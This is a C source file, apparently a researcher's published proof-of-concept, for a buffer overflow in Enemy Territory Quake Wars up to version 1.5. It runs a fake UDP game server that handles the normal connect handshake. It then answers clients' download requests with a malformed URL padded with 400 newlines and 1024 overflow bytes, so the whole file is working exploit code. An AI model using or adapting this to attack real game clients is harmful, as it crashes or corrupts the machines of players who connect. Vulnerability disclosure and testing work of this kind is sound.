/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define strictmp    strcasecmp
    #define stristr     strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1a"
#define PORT        27733
#define BUFFSZ      32768   // max used by ETQW



int myrnd(void);
int putcc(u8 *dst, int chr, int len);
int putss(u8 *dst, u8 *par, u8 *val);
int putxx(u8 *data, u32 num, int bits);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            i,
            on      = 1,
            psz,
            len,
            tmp;
    u16     port    = PORT;
    u8      *buff,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Enemy Territory Quake Wars <= 1.5 invalid URL buffer-overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [port_to_bind(%u)]\n"
            "\n", argv[0], port);
        //exit(1);
    }
    if(argc > 1) port = atoi(argv[1]);

    peer.sin_addr.s_addr = INADDR_ANY;
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(struct sockaddr_in);

    printf("- bind UDP port %u\n", port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));
    if(bind(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
      < 0) std_err();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    printf(
        "- now connect your test client to this computer and port %u\n"
        "  example from command-line:         game.exe +connect localhost:%hu\n"
        "  example from console (CTRL+ALT+~): connect localhost:%hu\n"
        "\n", port, port, port);
    printf("- clients:\n");
    for(;;) {
        len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
        if(len < 0) std_err();

        printf("  %s:%hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
        show_dump(buff, len, stdout);
        fputc('\n', stdout);

        if((buff[0] == 0xff) && (buff[1] == 0xff)) {
            p = buff + 2;
            if(!stricmp(p, "getStatus")) {
                p += putss(p, "statusResponse", NULL);
                p += putxx(p, -1,       32);
                p += putxx(p, -1,       32);
            #ifdef ETQW_DEMO
                p += putxx(p, 19,       16);
                p += putxx(p, 12,       16);
            #else
                p += putxx(p, 21,       16);    // minor protocol (etqw demo uses 19)
                p += putxx(p, 10,       16);    // major protocol (etqw demo uses 12)
            #endif
                p += putxx(p, 153,      32);
                p += putss(p, "ETQW Server", NULL);
                p += putxx(p, 24,       16);
                p += putss(p, "maps/valley.entities", NULL);
                p += putxx(p, 0,        16);
                p += putss(p, "si_teamDamage", "1");
                p += putss(p, "si_rules", "sdGameRulesCampain");
                p += putss(p, "si_teamForceBalance", "1");
                p += putss(p, "si_allowLateJoin", "1");
                p += putxx(p, 0,        32);
                p += putxx(p, -1,       32);
                p += putxx(p, 0,        32);
                p += putxx(p, 256,      32);

            } else if(!stricmp(p, "challenge")) {
                p += putss(p, "challengeResponse", NULL);
                p += putxx(p, myrnd(),  32);

            #ifdef NON_ETQW
                p += putxx(p, 1,        8);
                p += putxx(p, 24,       16);
                p += putss(p, "base", NULL);    // the client will create a folder with this name!
            #else
                p += putxx(p, 15996,    32);    // doom3 compatible?
                p += putxx(p, 0,        32);
                p += putxx(p, 0,        32);
                p += putss(p, "", "");          // mods
            #endif

            } else if(!stricmp(p, "connect")) {
                p += putss(p, "pureServer", NULL);
                tmp = myrnd() % 0x7e;
                if(tmp < 3) tmp = 3;
                for(i = 0; i < tmp; i++) {      // max 0x7e (+delimiter)
                    p += putxx(p, myrnd(), 32); // checksums
                #ifdef NON_ETQW
                    p += sprintf(p, "base/pak%02d.pk4", i) + 1; // doesn't matter
                #endif
                }
                p += putxx(p, 0,        32);    // delimiter
                p += putxx(p, myrnd(),  32);    // game code pak
                //p += putxx(p, 0,        32);

            } else if(!stricmp(p, "downloadRequest")) {
                i = *(u32 *)(p + 0x16);
                p += putss(p, "downloadInfo", NULL);
                p += putxx(p, i,  32);
                p += putxx(p, 1,    8);
                *p++ = '\b' /*' '*/;        // the bug is in avoiding the http:// prefix!
                p += sprintf(p, "%s", "http://SERVER/valid_file.pk4");
                p += putcc(p, '\n', 400);   // hide the big string
                p += putcc(p, 'A',  1024);  // overflow
                *p++ = 0;

            } else {
                /*
                // print
                p += putss(p, "print", NULL);
                p += putxx(p, -1,   32);
                p += putss(p, "message here", NULL);
                */
                continue;
            }

            show_dump(buff, p - buff, stdout);
            sendto(sd, buff, p - buff, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
        }
    }

    close(sd);
    return(0);
}



int myrnd(void) {
    static int  rnd = 0;

    if(!rnd) rnd = ~time(NULL);
    rnd = ((rnd * 0x343FD) + 0x269EC3) >> 1;
    return(rnd);
}



int putcc(u8 *dst, int chr, int len) {
    memset(dst, chr, len);
    return(len);
}



int putss(u8 *dst, u8 *par, u8 *val) {
    int     plen = 0,
            vlen = 0;

    plen = strlen(par) + 1;
    memcpy(dst, par, plen);
    if(val) {
        vlen = strlen(val) + 1;
        memcpy(dst + plen, val, vlen);
    }
    return(plen + vlen);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        //data[i] = (num >> ((bytes - 1 - i) << 3));
        data[i] = (num >> (i << 3));
    }
    return(bytes);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


